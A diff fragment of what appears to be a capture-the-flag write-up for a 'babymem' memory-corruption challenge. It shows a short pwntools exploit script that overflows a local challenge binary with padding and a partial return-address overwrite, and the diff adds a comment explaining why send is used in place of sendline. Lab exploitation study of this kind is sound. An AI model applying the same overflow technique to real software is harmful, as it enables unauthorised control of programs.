@@ -153,7 +153,7 @@ payload = padding + b"\x90\x24"    #\x90 = +28
 p = process('/challenge/babymem_level7.0')         
 p.read()
 p.sendline('144')
-p.send(payload)                         
+p.send(payload)   # important! with sendline it changes the length cz it sends another byte '\n'                    
 p.interactive() 
 ```
 ## 7.1 
